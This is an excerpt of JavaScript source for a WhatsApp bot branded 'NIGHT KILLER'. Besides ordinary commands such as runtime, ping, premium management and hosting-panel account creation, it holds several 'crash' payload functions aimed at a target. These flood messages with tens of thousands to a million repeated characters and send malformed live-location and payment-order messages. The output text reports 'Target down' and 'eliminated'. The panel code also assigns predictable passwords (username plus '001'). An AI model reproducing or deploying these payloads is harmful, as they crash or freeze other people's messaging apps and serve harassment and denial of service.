...
await ryozingod.updateProfileStatus(`✳️ NIGHT KILLER - Client By : NIGHT || ✅ Runtime : ${uptime}`)
...
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"✳️᜴࿆͆᷍𝕾𝕻𝕴𝕯𝕰𝕽 𝖁5̿╮⭑ ☠️⃰͜͡؜NIGHT⭐️᜴ # ˢᵃᵐˢཀ͜͡✅⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
...
title: `© Night Version 5.1.1`,
body: `${ucapanWaktu} ${m.pushName} 👋`,
previewType: "VIDEO",
thumbnail: selectedThumbnail,
sourceUrl:`https://chat.whatsapp.com/EKdEedxpyW9AqMZOdn7cky`,
mediaUrl: `https://chat.whatsapp.com/EKdEedxpyW9AqMZOdn7cky`
}
},
text: teks
}, {
...
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `✳️᜴࿆͆᷍𝕾𝕻𝕴𝕯𝕰𝕽 𝖁5̿╮⭑ ☠️⃰͜͡؜NIGHT⭐️᜴▴ˢᵃᵐˢཀ͜͡✅⃟╮.xp`+"ꦾ".repeat(50000),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
...
async function bakdok(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "documentMessage": {
    ...
    "fileName": `✳️᜴࿆͆̿᷍𝕾𝕻𝕴𝕯𝕰𝕽 𝖁5⭑ ☠️⃰͜͡؜NIGHT⭐️᜴▴ˢᵃᵐˢཀ͜͡✅⃟╮.xp`+"ྦྷ".repeat(60000),
 ...
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
    interactiveMessage: {
      header: {
        ...
        hasMediaAttachment: true,
        ...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/6aa754529282c05dae042.jpg" } }, { upload: ryozingod.waUploadToServer }))
      },
      body: {
        text: ""
      },
 ...
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  'listMessage': {
    'title': "𝕾𝖕𝖎𝖉𝖊𝖗➯𝖂𝖊𝖇➊"+" ".repeat(920000),
        'footerText': `✳️᜴࿆͆᷍𝕾𝕻𝕴𝕯𝕰𝕽 𝖁5̿╮⭑ ☠️⃰͜͡؜NIGHT⭐️᜴▴ˢᵃᵐˢཀ͜͡✅⃟╮.xp`,
        'description': `✳️᜴࿆͆᷍𝕾𝕻𝕴𝕯𝕰𝕽 𝖁5̿╮⭑ ☠️⃰͜͡؜NIGHT⭐️᜴▴ˢᵃᵐˢཀ͜͡✅⃟╮.xp`,
        'buttonText': null,
        'listType': 2,
        'productListInfo': {
          'productSections': [{
...
if (m.message) {
  if (isCmd && !m.isGroup) {
    ...
    console.log(chalk.white(chalk.bgHex('#4a69bd').bold(`🏙️ HOW FAR GEE☠`)));
...
"newsletterName": 'By Night Execution Vault',
"serverMessageId": 1
},
},
"header": {
...
❕𝐎𝐖𝐍𝐄𝐑 : https://api.whatsapp.com/send?phone=+2347067135317
...
//=================================================//
case 'runtime':
                let pinga = ` ⭔ ━━━━━━━ ⸙ NIGHTY NIGHT ⸙ ━━━━━━━ ⭔𝖗 Is Active${runtime(process.uptime())}`
                ryozingod.sendMessage(m.chat, {
                    ...
                    contextInfo: {
                        externalAdReply: {
                            ...
                            title: `NIGHTY NIGHT`,
                            body: `NIGHT`,
                            thumbnailUrl: 'https://telegra.ph/file/6aa754529282c05dae042.jpg',
                            sourceUrl: 'https://chat.whatsapp.com/EPSGKau0IV7J5lyOO7Jk',
                            mediaType: 1,
...
case 'ping': {
 ...
 await ryozingod.relayMessage(m.chat, {
      protocolMessage: {
        ...
        type: 14,
        editedMessage: {
          conversation: `*𝕹𝖎𝖌𝖍𝖙𝖞 𝖓𝖎𝖌𝖍𝖙 𝚂𝙿𝙴𝙴𝙳 ➟* *${new Date() - startTime}* 𝙼𝚂`
        }
      }
    }, {});
  } 
...
const audiovn = "./Alive.mp3";
    const dooc = {
        ...
        contextInfo: {
          mentionedJid: [m.sender],
          externalAdReply: {
          title: "Call Me 𝕹𝖎𝖌𝖍𝖙𝖞 𝖓𝖎𝖌𝖍𝖙",
          body: "https://chat.whatsapp.com/EKdEedxpyW9AqMZOdn7cky",
...
let teks = `*GENERATED BY 𝕹𝖎𝖌𝖍𝖙𝖞 𝖓𝖎𝖌𝖍𝖙5*`
...
await sleep(2000)
ryozingod.sendMessage(args[0] + "@s.whatsapp.net", {image: {url: `https://telegra.ph/file/df56beb9bacadce348dd6.jpg`}, caption: `Kamu sekarang adalah Anggota Premium`},{quoted: qevent })
}
}
break
//=================================================//
...
joreply("Sukses Via Nomer")
await sleep(2000)
ryozingod.sendMessage(targetNumber, {image: {url: `https://telegra.ph/file/df56beb9bacadce348dd6.jpg`}, caption: `Kamu sekarang adalah Anggota Premium`},{quoted: qevent })
} else {
...
ryozingod.sendMessage(prem1+'@s.whatsapp.net', {image: {url: `https://telegra.ph/file/6aa754529282c05dae042.jpg`}, caption: `Kamu sekarang adalah owner / kontributor bot`},{quoted: qpay})
}
break
//=================================================//
case 'delowner': {
...
image: { url: 'https://telegra.ph/file/df56beb9bacadce348dd6.jpg' },
...
return ryozingod.sendMessage(m.chat, {
image: { url: 'https://telegra.ph/file/bbfddf5fadbeec4e822fa.jpg' },
caption: `You were caught after you corrupted social assistance funds🕴️💰, and you have to pay a fine of 3 million naira💵`
});
...
return ryozingod.sendMessage(m.chat, {
image: { url: 'https://telegra.ph/file/bbfddf5fadbeec4e822fa.jpg' },
caption: `You succeeded in corrupting social assistance funds🕴️💰, and you got 3 million naira💵`
});
} else {
user.lastbansos = new Date() * 1;
return joreply(`Sorry, Bro Lu & succeeded in social assistance corruption and didn't go to jail because you 🏃‍♂️*`);
}
} else {
return joreply(`Please wait a few minutes for more social assistance`);
}
}
break;
...
akunlo = "https://telegra.ph/file/bbfddf5fadbeec4e822fa.jpg" 
if (!u) return
...
🔐 Password: ${password}
🔗 Url: ${domain}`
ryozingod.sendMessage(u, { image: { url: 'https://telegra.ph/file/5dd69fb2cc32f03dfafdc.jpg' }, caption: ctf }, { quoted: m })
...
let disk = "2024"
let email = username + "zxv@sweetrabit.ml"
akunlo = "https://telegra.ph/file/5dd69fb2cc32f03dfafdc.jpg" 
if (!u) return
let d = (await ryozingod.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+'001'
let f = await fetch(domain + "/api/application/users", {
...
🔐 Password: ${password}
🔗 Url: ${domain}`
ryozingod.sendMessage(u, { image: { url: 'https://telegra.ph/file/df56beb9bacadce348dd6.jpg' }, caption: ctf }, { quoted: m })
let data2 = await f2.json()
let startup_cmd = data2.attributes.startup
let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
...
let disk = "8024"
let email = username + "zxv@sweetrabit.ml"
akunlo = "https://telegra.ph/file/df56beb9bacadce348dd6.jpg" 
if (!u) return
let d = (await ryozingod.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+'001'
let f = await fetch(domain + "/api/application/users", {
...
🔐 Password: ${password}
🔗 Url: ${domain}`
ryozingod.sendMessage(u, { image: { url: 'https://telegra.ph/file/6aa754529282c05dae042.jpg' }, caption: ctf }, { quoted: m })
let data2 = await f2.json()
let startup_cmd = data2.attributes.startup
let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
...
let disk = "6024"
let email = username + "zxv@sweetrabit.ml"
akunlo = "https://telegra.ph/file/6aa754529282c05dae042.jpg" 
if (!u) return
let d = (await ryozingod.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+'001'
let f = await fetch(domain + "/api/application/users", {
...
message: {
  "interactiveMessage": {
    ...
    "footer": {
      "text": "NIGHT KILLER © NIGHT Execution Vault"
    },
    "nativeFlowMessage": {
      "buttons": [
        {
  ...
  "interactiveMessage": {
    ...
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "cta_url",
          "buttonParamsJson": "{ display_text : '⿻NIGHT⿻', url : , merchant_url :  }"
        }
      ],
      "messageParamsJson": " ".repeat(1000000)
    }
...
for (let j = 0; j < q; j++) {
await ryozingod.sendVideoAsSticker(m.chat, mengkece, force, { packname: 'Night Execution Vault', author: 'TheZetsuboXygen' })
}
}
break
...
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `✳️᜴࿆͆᷍𝕾𝕻𝕴𝕯𝕰𝕽 𝖁5̿╮⭑ ☠️⃰͜͡؜NIGHT⭐️᜴▴ˢᵃᵐˢཀ͜͡✅⃟╮.xp`,
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
...
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `✳️᜴࿆͆᷍𝕾𝕻𝕴𝕯𝕰𝕽 𝖁5̿╮⭑ ☠️⃰͜͡NIGHT⭐️᜴▴ˢᵃᵐˢཀ͜͡✅⃟╮.xp`,
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
...
body: `⁗ ⋄Target down 💀🥹`,
previewType: "VIDEO",
sourceUrl: `༑ 𝕹𝖎𝖌𝖍𝖙𝖞 𝖓𝖎𝖌𝖍𝖙⿻`,
mediaType: 1,
mediaUrl: 'https://chat.whatsapp.com/EKdEedxpyW9AqMZOdn7cky'
}
},
text: '𝙏𝙖𝙧𝙜𝙚𝙩 𝙝𝙖𝙨 𝙗𝙚𝙚𝙣 𝙚𝙡𝙞𝙢𝙞𝙣𝙖𝙩𝙚𝙙 𝘽𝙮 *𝕹𝖎𝖌𝖍𝖙𝖞 𝖓𝖎𝖌𝖍𝖙* 𝘽𝙮  By NIGHT '
}, {
quoted: m
})
}
